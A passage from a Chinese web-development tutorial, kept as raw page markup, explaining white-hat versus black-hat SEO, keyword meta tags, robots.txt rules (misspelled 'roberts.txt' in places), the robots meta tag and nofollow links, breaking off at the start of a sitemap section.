data-first-offset="true"><span data-slate-string="true">SEO 相关技术</span></span></span></h2> 
<div class="se-1c6b6b9e " data-slate-type="paragraph" data-slate-object="block" data-key="1319"> 
<span data-slate-object="text" data-key="1320"><span data-slate-leaf="true" data-offset-key="1320:0" 
data-first-offset="true"><span data-slate-string="true">下面我们再来从工程实现的角度一窥 SEO 技术。技术是要为业务目的服务的，我们最大的目的，是为了让网站的内容更真实、更合理地暴露在搜索引擎的搜索结果中。</span></span></span> 
</div> <h3 class="se-0b4b9d2f" data-slate-type="heading" data-slate-object="block" data-key="1321"><span 
data-slate-object="text" data-key="1322"><span data-slate-leaf="true" data-offset-key="1322:0" 
data-first-offset="true"><span data-slate-string="true">1. 白帽和黑帽</span></span></span></h3> 
<div class="se-f810dd15 " data-slate-type="paragraph" data-slate-object="block" data-key="1323"> 
<span data-slate-object="text" data-key="1324"><span data-slate-leaf="true" data-offset-key="1324:0" 
data-first-offset="true"><span data-slate-string="true">当我们明确了上述的目的，遵循搜索引擎规则，通过正当和高效的技术途径来实现 
SEO 的效果，这样的方法叫做</span></span></span><span data-slate-object="text" data-key="1325"><span data-slate-leaf="true" 
data-offset-key="1325:0" data-first-offset="true"><span class="se-74375a5f" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">白帽（White Hat）法</span></span></span></span><span 
data-slate-object="text" data-key="1326"><span data-slate-leaf="true" data-offset-key="1326:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span><span data-slate-object="text" 
data-key="1327"><span data-slate-leaf="true" data-offset-key="1327:0" data-first-offset="true"><span 
class="se-250846e4" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">相应的，如果是通过作弊、欺骗这样的手段，就叫做黑帽（Black 
Hat）法</span></span></span></span><span data-slate-object="text" data-key="1328"><span data-slate-leaf="true" 
data-offset-key="1328:0" data-first-offset="true"><span data-slate-string="true">。如果你了解过网络安全中的白帽和黑帽，那么这里的含义其实是一致的。</span></span></span> 
</div> <div class="se-f5ccab10 " data-slate-type="paragraph" data-slate-object="block" data-key="1329"> 
<span data-slate-object="text" data-key="1330"><span data-slate-leaf="true" data-offset-key="1330:0" 
data-first-offset="true"><span data-slate-string="true">搜索引擎在评估网站前文所述的影响力的时候，有许许多多不同的“</span></span></span><span 
data-slate-object="text" data-key="1331"><span data-slate-leaf="true" data-offset-key="1331:0" 
data-first-offset="true"><span class="se-10ab2194" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">Ranking Signal</span></span></span></span><span data-slate-object="text" 
data-key="1332"><span data-slate-leaf="true" data-offset-key="1332:0" data-first-offset="true"><span 
data-slate-string="true">”，它指的就是会影响返回的网页排序的“信号”，它们共同决定了一个页面的影响力，对于 Google 搜索来说 ，</span></span></span><span 
data-slate-object="text" data-key="1333"><span data-slate-leaf="true" data-offset-key="1333:0" 
data-first-offset="true"><span class="se-30f99f1e" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">前面我们提到的 PageRank，只是其中之一</span></span></span></span><span data-slate-object="text" 
data-key="1334"><span data-slate-leaf="true" data-offset-key="1334:0" data-first-offset="true"><span 
data-slate-string="true">。这里面大多数的信号，都可以应用相应的 SEO 规则来进行优化，我随便举几个例子：</span></span></span> </div> 
<div class="se-d0f9ef51" data-slate-type="list" data-slate-object="block" data-key="1335"> 
<div class="se-8b5a8865 se-b02a7c52" data-slate-type="list-line" data-slate-object="block" 
data-key="1336"> <span data-slate-object="text" data-key="1337"><span data-slate-leaf="true" 
data-offset-key="1337:0" data-first-offset="true"><span data-slate-string="true">网站的正常运行时间。比方说，如果一个站点，在爬虫爬取的时候总是遭遇 
4xx、5xx 这样的错误，显然对影响力是一个负面的加权。</span></span></span> </div> <div class="se-05d61610 se-793124ce" 
data-slate-type="list-line" data-slate-object="block" data-key="1338"> <span data-slate-object="text" 
data-key="1339"><span data-slate-leaf="true" data-offset-key="1339:0" data-first-offset="true"><span 
data-slate-string="true">网站的年龄，网页内容的新鲜程度，好的原创内容总是最好的优化方式。</span></span></span> </div> <div 
class="se-9feb2a18 se-1cbfb0b4" data-slate-type="list-line" data-slate-object="block" data-key="1340"> 
<span data-slate-object="text" data-key="1341"><span data-slate-leaf="true" data-offset-key="1341:0" 
data-first-offset="true"><span data-slate-string="true">网站采用 HTTPS 还是 HTTP，显然 HTTPS 要更优。</span></span></span> 
</div> <div class="se-531e8122 se-e027c3ac" data-slate-type="list-line" data-slate-object="block" 
data-key="1342"> <span data-slate-object="text" data-key="1343"><span data-slate-leaf="true" 
data-offset-key="1343:0" data-first-offset="true"><span data-slate-string="true">HTML 代码的质量，是否存在错误。</span></span></span> 
</div> <div class="se-723ace4c se-cf86d936" data-slate-type="list-line" data-slate-object="block" 
data-key="1344"> <span data-slate-object="text" data-key="1345"><span data-slate-leaf="true" 
data-offset-key="1345:0" data-first-offset="true"><span data-slate-string="true">网页在站点访问的深度。</span></span></span> 
</div> </div> <div class="se-2a0c5031 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1346"> <span data-slate-object="text" data-key="1347"><span data-slate-leaf="true" 
data-offset-key="1347:0" data-first-offset="true"><span data-slate-string="true">当然，黑帽法我们也来简单了解几个。</span></span></span> 
</div> <div class="se-097c5b71 " data-slate-type="paragraph" data-slate-object="block" data-key="1348"> 
<span data-slate-object="text" data-key="1349"><span data-slate-leaf="true" data-offset-key="1349:0" 
data-first-offset="true"><span class="se-ea782142" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">关键字堆砌</span></span></span></span><span data-slate-object="text" data-key="1350"><span 
data-slate-leaf="true" data-offset-key="1350:0" data-first-offset="true"><span data-slate-string="true">：说白了就是放置大量的甚至和网页内容无关的关键字，比方说在页面上放置一些无关的关键字，并将它们的样式设置为透明，这样用户看不见，但是搜索引擎就以为这个页面和这些额外的关键字有关，在一些本该无关的搜索中会增加曝光度。</span></span></span><span 
data-slate-object="text" data-key="1351"><span data-slate-leaf="true" data-offset-key="1351:0" 
data-first-offset="true"><span class="se-165f82ea" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">这其实就是给搜索引擎和用户看不同的页面</span></span></span></span><span data-slate-object="text" 
data-key="1352"><span data-slate-leaf="true" data-offset-key="1352:0" data-first-offset="true"><span 
data-slate-string="true">，搜索引擎看的页面堆砌了大量的无关关键字，而用户看到的才是正常的网页，这种方法被称为 Cloaking。</span></span></span> 
</div> <div class="se-9d55b83f " data-slate-type="paragraph" data-slate-object="block" data-key="1353"> 
<span data-slate-object="text" data-key="1354"><span data-slate-leaf="true" data-offset-key="1354:0" 
data-first-offset="true"><span data-slate-string="true">还有一种方法叫做 Doorway Pages，这种技术则是创建一个堆砌关键字的临时页面，用户访问的时候，则自动转向正常的网页，或是主页。你可以看到这些黑帽技术，都是为了糊弄搜索引擎而添加了某些本不该出现在页面里的关键字。</span></span></span> 
</div> <div class="se-0dfdb1e3 " data-slate-type="paragraph" data-slate-object="block" data-key="1355"> 
<span data-slate-object="text" data-key="1356"><span data-slate-leaf="true" data-offset-key="1356:0" 
data-first-offset="true"><span class="se-16f59e76" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">链接农场</span></span></span></span><span data-slate-object="text" data-key="1357"><span 
data-slate-leaf="true" data-offset-key="1357:0" data-first-offset="true"><span data-slate-string="true">（Link 
Farm）：将网站链接放到很多本不该进行外链的其它网站页面上，比如花钱买一些不相关的内容，强行建立外链。不知道你有没有听说过“</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="1358" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="1359"><span data-slate-leaf="true" data-offset-key="1359:0" data-first-offset="true"><span 
data-slate-string="true">Google 轰炸</span></span></span></a><span data-slate-object="text" data-key="1360"><span 
data-slate-leaf="true" data-offset-key="1360:0" data-first-offset="true"><span data-slate-string="true">”，它本质上就属于这种方法。当年人们搜索“more 
evil than Satan”（比撒但还邪恶）的时候，结果的第一条居然出现了微软的主页。</span></span></span> </div> <div class="se-6ccb874d 
" data-slate-type="paragraph" data-slate-object="block" data-key="1361"> <span data-slate-object="text" 
data-key="1362"><span data-slate-leaf="true" data-offset-key="1362:0" data-first-offset="true"><span 
class="se-97965da3" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">Article 
Spinning</span></span></span></span><span data-slate-object="text" data-key="1363"><span data-slate-leaf="true" 
data-offset-key="1363:0" data-first-offset="true"><span data-slate-string="true">：这种技术将一些其它网站已有的内容拷贝过来，做一些用来欺骗搜索引擎的修改，让搜索引擎以为是一份新的内容。比如，替换一些特定的词语、句子，添加一些毫无意义的用户不可见的内容，等等。</span></span></span> 
</div> <h3 class="se-b34337fb" data-slate-type="heading" data-slate-object="block" data-key="1364"><span 
data-slate-object="text" data-key="1365"><span data-slate-leaf="true" data-offset-key="1365:0" 
data-first-offset="true"><span data-slate-string="true">2. 站内优化和站外优化</span></span></span></h3> 
<div class="se-e35fbb83 " data-slate-type="paragraph" data-slate-object="block" data-key="1366"> 
<span data-slate-object="text" data-key="1367"><span data-slate-leaf="true" data-offset-key="1367:0" 
data-first-offset="true"><span data-slate-string="true">SEO 的优化方式，可以大致分为站内的和站外的。站内优化，其实指的就是在自己管理的网站内部做优化工作来实现 
SEO。比如我们之前反复提到的关键字，现在，我们不妨动手来体会一下。</span></span></span> </div> <div class="se-2f52a7da " data-slate-type="paragraph" 
data-slate-object="block" data-key="1368"> <span data-slate-object="text" data-key="1369"><span 
data-slate-leaf="true" data-offset-key="1369:0" data-first-offset="true"><span data-slate-string="true">在浏览器地址栏中输入 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1370" class="se-d795ea91 
se-eb2c7cbb"><span data-slate-object="text" data-key="1371"><span data-slate-leaf="true" data-offset-key="1371:0" 
data-first-offset="true"><span data-slate-string="true">https://time.geekbang.org</span></span></span></a><span 
data-slate-object="text" data-key="1372"><span data-slate-leaf="true" data-offset-key="1372:0" 
data-first-offset="true"><span data-slate-string="true">，打开极客时间的页面，右键点击页面空白处并查看网页源代码，你会看到这样的 
meta 标签：</span></span></span> </div> <div class="se-c64beaeb se-0c689716" data-slate-type="pre" 
data-slate-object="block" data-key="1373" data-code-language="objectivec"> <div class="se-c41b82b1 
se-2b8132a8"> <span></span> </div> <div class="se-6e2ac98c"> <div class="se-f1c63465 se-30b8bf6b" 
data-code-line-number="1"></div> </div> <div class="se-a343a4ef ps ps--active-x"> <div class="se-0efb589d 
se-39cfb103" data-slate-type="code-line" data-slate-object="block" data-key="1374"> <span data-slate-object="text" 
data-key="1375"><span data-slate-leaf="true" data-offset-key="1375:0" data-first-offset="true"><span 
data-slate-string="true">&lt;meta name=keywords content= 极客时间,IT, 职业教育, 知识付费, 二叉树, 极客 Live, 
极客搜索, 互联网, 前端开发, 后端开发, 编程语言, 人工智能, 区块链, 技术大会, 技术管理, 产品, 研发, 测试, 运维, 数据库, 架构, 微服务, 实战, 技术专家,Java,iOS,Android,Linux,Go 
</span></span><span data-slate-leaf="true" data-offset-key="1375:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_1670978211" data-annotation-type="annotation"><span 
data-slate-string="true">id</span></span></span><span data-slate-leaf="true" data-offset-key="1375:2"><span 
data-slate-string="true">=metakeywords&gt;</span></span></span> </div> <div class="ps__rail-x" 
style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 
0px; width: 69px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div 
class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> 
<div class="se-31832bf6 " data-slate-type="paragraph" data-slate-object="block" data-key="1376"> 
<span data-slate-object="text" data-key="1377"><span data-slate-leaf="true" data-offset-key="1377:0" 
data-first-offset="true"><span data-slate-string="true">这就是极客时间网站的关键词，这些关键词会让搜索引擎用户在搜索的时候准确地找到这个网站。除了 
keywords 的 meta 标签，还有一些其它起到帮助搜索引擎更准确地认识网站的 HTML 标签，比如 description 的 meta 标签，title 标签等等。对于 HTML 
的正文，你也许还记得我们在 </span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1378" 
class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" data-key="1379"><span data-slate-leaf="true" 
data-offset-key="1379:0" data-first-offset="true"><span data-slate-string="true">[第 17 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1380"><span data-slate-leaf="true" data-offset-key="1380:0" 
data-first-offset="true"><span data-slate-string="true"> 介绍的 HTML 语义化标签，它们都可以帮助搜索引擎更好地理解内容。</span></span></span> 
</div> <div class="se-6aad83a1 " data-slate-type="paragraph" data-slate-object="block" data-key="1381"> 
<span data-slate-object="text" data-key="1382"><span data-slate-leaf="true" data-offset-key="1382:0" 
data-first-offset="true"><span data-slate-string="true">正如其名，站外优化则和站内优化相反，优化工作是在目标站之外开展的，比如众所周知的“友情链接”，就是一种提供外链的站外优化方式。</span></span></span> 
</div> <h3 class="se-49e6c40b" data-slate-type="heading" data-slate-object="block" data-key="1383"><span 
data-slate-object="text" data-key="1384"><span data-slate-leaf="true" data-offset-key="1384:0" 
data-first-offset="true"><span data-slate-string="true">3. roberts.txt</span></span></span></h3> 
<div class="se-a3cce112 " data-slate-type="paragraph" data-slate-object="block" data-key="1385"> 
<span data-slate-object="text" data-key="1386"><span data-slate-leaf="true" data-offset-key="1386:0" 
data-first-offset="true"><span data-slate-string="true">“roberts.txt”是网站根目录下直接能够访问到的文本文件，它是一个对于网络爬虫的规约，告诉它这个网站下哪些内容你是可以爬取的，哪些内容你是不能爬的。值得注意的是，</span></span></span><span 
data-slate-object="text" data-key="1387"><span data-slate-leaf="true" data-offset-key="1387:0" 
data-first-offset="true"><span class="se-6e360e76" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">roberts.txt 不是标准，也不是规范，而是一种“约定俗成”</span></span></span></span><span 
data-slate-object="text" data-key="1388"><span data-slate-leaf="true" data-offset-key="1388:0" 
data-first-offset="true"><span data-slate-string="true">，几乎所有的搜索引擎都会遵守它。</span></span></span> 
</div> <div class="se-3c429ebf " data-slate-type="paragraph" data-slate-object="block" data-key="1389"> 
<span data-slate-object="text" data-key="1390"><span data-slate-leaf="true" data-offset-key="1390:0" 
data-first-offset="true"><span data-slate-string="true">这就好像你在你家门口贴了张条，哪些过路人可以敲你家的门，而哪些人不可以，那么路过的人大多会按这张纸条上的要求去做，但如果你不受欢迎而硬要去敲门（访问），那么也没有任何人可以阻止你，但至于主人开不开门（是否响应请求），或者给不给好脸色（是否返回正常结果），就是另一回事了。</span></span></span> 
</div> <div class="se-4d55a207 " data-slate-type="paragraph" data-slate-object="block" data-key="1391"> 
<span data-slate-object="text" data-key="1392"><span data-slate-leaf="true" data-offset-key="1392:0" 
data-first-offset="true"><span data-slate-string="true">现在，你可以打开浏览器，在浏览器中输入 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1393" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1394"><span data-slate-leaf="true" data-offset-key="1394:0" 
data-first-offset="true"><span data-slate-string="true">https://www.google.com/robots.txt</span></span></span></a><span 
data-slate-object="text" data-key="1395"><span data-slate-leaf="true" data-offset-key="1395:0" 
data-first-offset="true"><span data-slate-string="true"> 来访问 Google 的 roberts.txt 文件。你将看到如下信息：</span></span></span> 
</div> <div class="se-8c2c8d0e se-67c5fb40" data-slate-type="pre" data-slate-object="block" 
data-key="1396" data-code-language="cpp"> <div class="se-684a5791 se-148eac2c"> <span></span> 
</div> <div class="se-f3aba6f5"> <div class="se-9bed2252 se-74fbcdc4" data-code-line-number="1"></div> 
<div class="se-9bed2252 se-74fbcdc4" data-code-line-number="2"></div> <div class="se-9bed2252 
se-74fbcdc4" data-code-line-number="3"></div> <div class="se-9bed2252 se-74fbcdc4" data-code-line-number="4"></div> 
<div class="se-9bed2252 se-74fbcdc4" data-code-line-number="5"></div> <div class="se-9bed2252 
se-74fbcdc4" data-code-line-number="6"></div> <div class="se-9bed2252 se-74fbcdc4" data-code-line-number="7"></div> 
<div class="se-9bed2252 se-74fbcdc4" data-code-line-number="8"></div> <div class="se-9bed2252 
se-74fbcdc4" data-code-line-number="9"></div> <div class="se-9bed2252 se-74fbcdc4" data-code-line-number="10"></div> 
<div class="se-9bed2252 se-74fbcdc4" data-code-line-number="11"></div> <div class="se-9bed2252 
se-74fbcdc4" data-code-line-number="12"></div> <div class="se-9bed2252 se-74fbcdc4" data-code-line-number="13"></div> 
<div class="se-9bed2252 se-74fbcdc4" data-code-line-number="14"></div> <div class="se-9bed2252 
se-74fbcdc4" data-code-line-number="15"></div> <div class="se-9bed2252 se-74fbcdc4" data-code-line-number="16"></div> 
</div> <div class="se-f4279ddf ps"> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1397"> <span data-slate-object="text" data-key="1398"><span 
data-slate-leaf="true" data-offset-key="1398:0" data-first-offset="true"><span data-slate-string="true">User-agent: 
*</span></span></span> </div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1399"> <span data-slate-object="text" data-key="1400"><span 
data-slate-leaf="true" data-offset-key="1400:0" data-first-offset="true"><span data-slate-string="true">Disallow: 
/search</span></span></span> </div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1401"> <span data-slate-object="text" data-key="1402"><span 
data-slate-leaf="true" data-offset-key="1402:0" data-first-offset="true"><span data-slate-string="true">Allow: 
/search/about</span></span></span> </div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1403"> <span data-slate-object="text" data-key="1404"><span 
data-slate-leaf="true" data-offset-key="1404:0" data-first-offset="true"><span data-slate-string="true">Allow: 
/search/</span></span><span data-slate-leaf="true" data-offset-key="1404:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_0530391694" data-annotation-type="annotation"><span 
data-slate-string="true">static</span></span></span></span> </div> <div class="se-0efb589d 
se-39cfb103" data-slate-type="code-line" data-slate-object="block" data-key="1405"> <span data-slate-object="text" 
data-key="1406"><span data-slate-leaf="true" data-offset-key="1406:0" data-first-offset="true"><span 
data-slate-string="true">...</span></span></span> </div> <div class="se-0efb589d se-39cfb103" 
data-slate-type="code-line" data-slate-object="block" data-key="1407"> <span data-slate-object="text" 
data-key="1408"><span data-slate-leaf="true" data-offset-key="1408:0" data-first-offset="true"><span 
data-slate-string="true">Disallow: /imgres</span></span></span> </div> <div class="se-0efb589d 
se-39cfb103" data-slate-type="code-line" data-slate-object="block" data-key="1409"> <span data-slate-object="text" 
data-key="1410"><span data-slate-leaf="true" data-offset-key="1410:0" data-first-offset="true"><span 
data-slate-string="true">...</span></span></span> </div> <div class="se-0efb589d se-39cfb103" 
data-slate-type="code-line" data-slate-object="block" data-key="1411"> <span data-slate-object="text" 
data-key="1412"><span data-slate-leaf="true" data-offset-key="1412:0" data-first-offset="true"><span 
data-slate-string="true">（省略大量 Disallow 和 Allow 的配置）</span></span></span> </div> <div class="se-0efb589d 
se-39cfb103" data-slate-type="code-line" data-slate-object="block" data-key="1413"> <span data-slate-object="text" 
data-key="1414"></span> </div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1415"> <span data-slate-object="text" data-key="1416"><span 
data-slate-leaf="true" data-offset-key="1416:0" data-first-offset="true"><span data-slate-string="true">User-agent: 
Twitterbot</span></span></span> </div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1417"> <span data-slate-object="text" data-key="1418"><span 
data-slate-leaf="true" data-offset-key="1418:0" data-first-offset="true"><span data-slate-string="true">Allow: 
/imgres</span></span></span> </div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1419"> <span data-slate-object="text" data-key="1420"></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1421"> <span data-slate-object="text" data-key="1422"><span data-slate-leaf="true" 
data-offset-key="1422:0" data-first-offset="true"><span data-slate-string="true">User-agent: 
facebookexternalhit</span></span></span> </div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1423"> <span data-slate-object="text" data-key="1424"><span 
data-slate-leaf="true" data-offset-key="1424:0" data-first-offset="true"><span data-slate-string="true">Allow: 
/imgres</span></span></span> </div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1425"> <span data-slate-object="text" data-key="1426"></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1427"> <span data-slate-object="text" data-key="1428"><span data-slate-leaf="true" 
data-offset-key="1428:0" data-first-offset="true"><span data-slate-string="true">Sitemap: https:</span></span><span 
data-slate-leaf="true" data-offset-key="1428:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_2237066590" data-annotation-type="annotation"><span data-slate-string="true">//www.google.com/sitemap.xml</span></span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-51957b0a " data-slate-type="paragraph" data-slate-object="block" data-key="1429"> 
<span data-slate-object="text" data-key="1430"><span data-slate-leaf="true" data-offset-key="1430:0" 
data-first-offset="true"><span data-slate-string="true">这是说，对于默认的爬虫（User-agent 为 *），/search 
和 /imgres 是不允许爬取的，但是 /search/about 和 /search/static 是可以爬取的，请注意 Allow 指令比 Disallow 有更高的优先级；对于 
Twitter 和 Facebook 的爬虫，却是允许访问 /imgres 的。</span></span></span> </div> <div class="se-9c029a88 
" data-slate-type="paragraph" data-slate-object="block" data-key="1431"> <span data-slate-object="text" 
data-key="1432"><span data-slate-leaf="true" data-offset-key="1432:0" data-first-offset="true"><span 
data-slate-string="true">你可以看到，这样的配置是运行配置默认值，然后通过特殊值来覆写的（不知这能否让你回想起 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1433" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1434"><span data-slate-leaf="true" data-offset-key="1434:0" 
data-first-offset="true"><span data-slate-string="true">[第 28 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1435"><span data-slate-leaf="true" data-offset-key="1435:0" 
data-first-offset="true"><span data-slate-string="true"> 中介绍的类似的“默认值 + 特殊值覆写”的配置方式）。最后一行是网站地图 
sitemap.xml 的位置，我们下面会讲。</span></span></span> </div> <div class="se-a8042456 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1436"> <span data-slate-object="text" data-key="1437"><span 
data-slate-leaf="true" data-offset-key="1437:0" data-first-offset="true"><span data-slate-string="true">另外，如果你想让搜索引擎友好一点，就不要那么频繁地访问你的网站，你可以使用 
Crawl-delay 参数，用来告知连续的请求之间至少间隔多少秒，比如：</span></span></span> </div> <div class="se-518d64de se-99ab36d9" 
data-slate-type="pre" data-slate-object="block" data-key="1438"> <div class="se-a1728700 se-9f12f99b"> 
<span></span> </div> <div class="se-535fce32"> <div class="se-3f575cc4 se-9544edac" data-code-line-number="1"></div> 
</div> <div class="se-6ebc6046 ps"> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1439"> <span data-slate-object="text" data-key="1440"><span 
data-slate-leaf="true" data-offset-key="1440:0" data-first-offset="true"><span data-slate-string="true">Crawl-delay: 
5</span></span></span> </div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div 
class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" 
style="top: 0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 
0px;"></div> </div> </div> </div> <div class="se-061242b1 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1441"> <span data-slate-object="text" data-key="1442"><span data-slate-leaf="true" 
data-offset-key="1442:0" data-first-offset="true"><span data-slate-string="true">同样的，你可以看看百度的 
roberts.txt，访问 </span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1443" 
class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" data-key="1444"><span data-slate-leaf="true" 
data-offset-key="1444:0" data-first-offset="true"><span data-slate-string="true">https://www.baidu.com/robots.txt</span></span></span></a><span 
data-slate-object="text" data-key="1445"><span data-slate-leaf="true" data-offset-key="1445:0" 
data-first-offset="true"><span data-slate-string="true">，你会看到百度比较“特立独行”，它不允许 Google、有道、搜狗等多家搜索引擎的数据爬取。</span></span></span> 
</div> <div class="se-3fb7d34d " data-slate-type="paragraph" data-slate-object="block" data-key="1446"> 
<span data-slate-object="text" data-key="1447"><span data-slate-leaf="true" data-offset-key="1447:0" 
data-first-offset="true"><span data-slate-string="true">除了全站的搜索引擎爬取设定以外，能够按页来设置吗？可以，这时候你需要使用一个名为 
robots 的 meta 标签，这个标签在 HTML 的 head 内，用来告知该页的爬取策略。</span></span></span> </div> <div class="se-751195e6 
se-e19b3ee7" data-slate-type="pre" data-slate-object="block" data-key="1448" data-code-language="javascript"> 
<div class="se-aff1edd2 se-65bcf1aa"> <span></span> </div> <div class="se-70a6dd66"> <div class="se-3b7f4357 
se-a2ab1716" data-code-line-number="1"></div> </div> <div class="se-f96ecce6 ps ps--active-x"> 
<div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1449"> <span data-slate-object="text" data-key="1450"><span data-slate-leaf="true" 
data-offset-key="1450:0" data-first-offset="true"><span data-slate-string="true">&lt;meta name=</span></span><span 
data-slate-leaf="true" data-offset-key="1450:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_4170556356" data-annotation-type="annotation"><span data-slate-string="true">"robots"</span></span></span><span 
data-slate-leaf="true" data-offset-key="1450:2"><span data-slate-string="true"> content=</span></span><span 
data-slate-leaf="true" data-offset-key="1450:3"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_4734278600" data-annotation-type="annotation"><span data-slate-string="true">"noindex,nofollow"</span></span></span><span 
data-slate-leaf="true" data-offset-key="1450:4"><span data-slate-string="true"> /&gt;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 348px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-5cde828c " data-slate-type="paragraph" data-slate-object="block" 
data-key="1451"> <span data-slate-object="text" data-key="1452"><span data-slate-leaf="true" 
data-offset-key="1452:0" data-first-offset="true"><span data-slate-string="true">除页面以外，HTML 
的 a 标签（链接）也能够告诉搜索引擎不要进一步追踪爬取，方法就是使用 nofollow，如下：</span></span></span> </div> <div class="se-de829b3b 
se-91074fcb" data-slate-type="pre" data-slate-object="block" data-key="1453" data-code-language="javascript"> 
<div class="se-b60409f6 se-cf73c586"> <span></span> </div> <div class="se-4c071779"> <div class="se-822d1fd9 
se-6b77e003" data-code-line-number="1"></div> </div> <div class="se-93446553 ps ps--active-x"> 
<div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1454"> <span data-slate-object="text" data-key="1455"><span data-slate-leaf="true" 
data-offset-key="1455:0" data-first-offset="true"><span data-slate-string="true">&lt;a href=</span></span><span 
data-slate-leaf="true" data-offset-key="1455:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_6681702614" data-annotation-type="annotation"><span data-slate-string="true">"http://www.another-website.com/"</span></span></span><span 
data-slate-leaf="true" data-offset-key="1455:2"><span data-slate-string="true"> rel=</span></span><span 
data-slate-leaf="true" data-offset-key="1455:3"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_6137314371" data-annotation-type="annotation"><span data-slate-string="true">"nofollow"</span></span></span><span 
data-slate-leaf="true" data-offset-key="1455:4"><span data-slate-string="true">&gt; 另一个站点 &lt;</span></span><span 
data-slate-leaf="true" data-offset-key="1455:5"><span class=" gkhl-regexp" data-slate-object="annotation" 
data-annotation-key="gkann_7508621446" data-annotation-type="annotation"><span data-slate-string="true">/a&gt;</span></span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 239px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-f18bd67a " data-slate-type="paragraph" data-slate-object="block" 
data-key="1456"> <span data-slate-object="text" data-key="1457"><span data-slate-leaf="true" 
data-offset-key="1457:0" data-first-offset="true"><span data-slate-string="true">因此，是否允许爬取的建议，是可以在网站、页面和链接这三个级别分别设置的。</span></span></span> 
</div> <h3 class="se-afd24430" data-slate-type="heading" data-slate-object="block" data-key="1458"><span 
data-slate-object="text" data-key="1459"><span data-slate-leaf="true" data-offset-key="1459:0" 
data-first-offset="true"><span data-slate-string="true">4. 网站地图</span></span></span></h3> <div 
class="se-4f20f700 " data-slate-type="paragraph" data-slate-object="block" data-key="1460"> 
<span data-slate-object="text" data-key="1461"><span data-slate-leaf="true" data-offset-key="1461:0" 
data-first-offset="true"><span data-slate-string="true">网站地图就像前面提到的 roberts.txt 一样，是另一个和搜索引擎对话的途径。网站可能非常大，爬取一遍耗时长，但</span></span></span><span 
